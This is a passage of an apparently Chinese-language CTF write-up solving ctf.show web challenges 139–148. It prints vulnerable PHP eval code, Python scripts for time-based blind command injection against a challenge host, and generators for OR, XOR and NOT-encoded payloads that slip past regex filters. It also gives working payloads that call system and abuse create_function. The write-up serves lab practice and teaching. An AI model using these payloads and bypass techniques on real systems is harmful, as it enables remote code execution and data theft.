class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">str=string.ascii_letters+string.digits+&quot;_&#123;&#125;-&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,15):</span><br><span class="line">    key=0</span><br><span class="line">    for j in range(1,25):</span><br><span class="line">        if key==1:</span><br><span class="line">            break</span><br><span class="line">        for n in str:</span><br><span class="line">            payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)</span><br><span class="line">            print(payload)</span><br><span class="line">            url=&quot;http://6848ff5f-4aa7-49b0-b9f7-2de8346c9a36.challenge.ctf.show/?c=&quot;+payload</span><br><span class="line">            print(url)</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url,timeout=(2.5,2.5))</span><br><span class="line">            except:</span><br><span class="line">                result=result+n</span><br><span class="line">                print(result)</span><br><span class="line">                break</span><br><span class="line">            if n==&#x27;9&#x27;:</span><br><span class="line">                key=1</span><br><span class="line">                result+=&quot; &quot;</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>盲注出flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">str=string.ascii_letters+string.digits+&quot;_\&#123;\&#125;-&quot;</span><br><span class="line"></span><br><span class="line">#f149</span><br><span class="line">result=&quot;&quot;</span><br><span class="line">for j in range(1,45):</span><br><span class="line">    for n in str:</span><br><span class="line">        payload=&quot;if [ `cat /f149_15_h3r3 |cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)</span><br><span class="line">        # print(payload)</span><br><span class="line">        url=&quot;http://6848ff5f-4aa7-49b0-b9f7-2de8346c9a36.challenge.ctf.show/?c=&quot;+payload</span><br><span class="line">        # print(url)</span><br><span class="line">        try:</span><br><span class="line">            requests.get(url,timeout=(2.5,2.5))</span><br><span class="line">        except:</span><br><span class="line">            result=result+n</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又是弱类型的题，我们知道字符串转int被转为0，所以让code为0即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1=system&amp;f2=system</span><br></pre></td></tr></table></figure><h2 id="web141"><a href="#web141" class="headerlink" title="web141(|)"></a>web141(|)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line"></span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/^\W+$/&#x27;, $v3))&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在命令执行也用过类似的套路，还记得羽师傅的脚本</p><p>生成字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$myfile = fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">if($i&lt;16)&#123;</span><br><span class="line">$hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$hex_i=dechex($i);</span><br><span class="line">&#125;</span><br><span class="line">if($j&lt;16)&#123;</span><br><span class="line">$hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$hex_j=dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">$preg = &#x27;/[a-z]|[0-9]/i&#x27;;</span><br><span class="line">if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">else&#123;</span><br><span class="line">$a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">$b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">$c=(urldecode($a)|urldecode($b));</span><br><span class="line">if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">$contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line">def action(arg):</span><br><span class="line">   s1=&quot;&quot;</span><br><span class="line">   s2=&quot;&quot;</span><br><span class="line">   for i in arg:</span><br><span class="line">       f=open(&quot;rce_or.txt&quot;,&quot;r&quot;)</span><br><span class="line">       while True:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           if t==&quot;&quot;:</span><br><span class="line">               break</span><br><span class="line">           if t[0]==i:</span><br><span class="line">               #print(i)</span><br><span class="line">               s1+=t[2:5]</span><br><span class="line">               s2+=t[6:9]</span><br><span class="line">               break</span><br><span class="line">       f.close()</span><br><span class="line">   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">   return(output)</span><br><span class="line">   </span><br><span class="line">while True:</span><br><span class="line">   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;</span><br><span class="line">   print(param)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=2&amp;v3=/(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;);</span><br></pre></td></tr></table></figure><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    if(is_numeric($v1))&#123;</span><br><span class="line">        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);</span><br><span class="line">        sleep($d);</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不让他休眠即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=0</span><br></pre></td></tr></table></figure><h2 id="web143"><a href="#web143" class="headerlink" title="web143(^)"></a>web143(^)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;, $v3))&#123;</span><br><span class="line">                die(&#x27;get out hacker!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与web141类似这次使用^操作，稍微修改一下php脚本</p><p>查看文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=10&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0c%0c&quot;^&quot;%60%7f&quot;)*</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=10&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%21%60%60%60%60%2f%7f%60%7f&quot;)*</span><br></pre></td></tr></table></figure><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line"></span><br><span class="line">    if(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class="line">        if(preg_match(&#x27;/^\W+$/&#x27;, $v2))&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check($str)&#123;</span><br><span class="line">    return strlen($str)===1?true:false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接用上一轮的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=0&amp;v2=(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%21%60%60%60%60%2f%7f%60%7f&quot;)&amp;v3=-</span><br></pre></td></tr></table></figure><h2 id="web145"><a href="#web145" class="headerlink" title="web145(~)"></a>web145(~)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;, $v3))&#123;</span><br><span class="line">                die(&#x27;get out hacker!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用~运算，对之前的脚本进行很小的调整</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$myfile = fopen(&quot;rce_or1.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;(system)(ls);&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">if($i&lt;16)&#123;</span><br><span class="line">$hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$hex_i=dechex($i);</span><br><span class="line">&#125;</span><br><span class="line">if($j&lt;16)&#123;</span><br><span class="line">$hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$hex_j=dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">$preg = &#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;;</span><br><span class="line">if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">else&#123;</span><br><span class="line">$a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">$b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">$c=~urldecode($b);</span><br><span class="line">if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">$contents=$contents.$c.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($contents);</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line">def action(arg):</span><br><span class="line">   s1=&quot;&quot;</span><br><span class="line">   s2=&quot;&quot;</span><br><span class="line">   for i in arg:</span><br><span class="line">       f=open(&quot;rce_or1.txt&quot;,&quot;r&quot;)</span><br><span class="line">       while True:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           if t==&quot;&quot;:</span><br><span class="line">               break</span><br><span class="line">           if t[0]==i:</span><br><span class="line">               #print(i)</span><br><span class="line">               s1+=t[2:5]</span><br><span class="line">               break</span><br><span class="line">       f.close()</span><br><span class="line">   output=&quot;(\&quot;+&#x27;~&#x27;+&quot;+s1+&quot;\&quot;)&quot;</span><br><span class="line">   return(output)</span><br><span class="line">   </span><br><span class="line">while True:</span><br><span class="line">   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;</span><br><span class="line">   print(param)</span><br></pre></td></tr></table></figure><p>查看文件位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=2&amp;v3=?(~(%8c%86%8c%8b%9a%92))(~(%93%8c)):</span><br></pre></td></tr></table></figure><p>查看文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=2&amp;v3=?(~(%8c%86%8c%8b%9a%92))(~(%9c%9e%8b%df%99%93%9e%98%d1%8f%97%8f)):  </span><br></pre></td></tr></table></figure><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;, $v3))&#123;</span><br><span class="line">                die(&#x27;get out hacker!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要难点变为中间的运算符难搞</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=2&amp;v3=|(~(%8c%86%8c%8b%9a%92))(~(%9c%9e%8b%df%99%93%9e%98%d1%8f%97%8f))|</span><br></pre></td></tr></table></figure><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;ctf&#x27;]))&#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;</span><br><span class="line">        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?show=;&#125;;system(&#x27;grep flag flag.php&#x27;);/*</span><br><span class="line">[post data]</span><br><span class="line">ctf=%5ccreate_function</span><br></pre></td></tr></table></figure><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_ctfshow_fl0g()&#123;</span><br><span 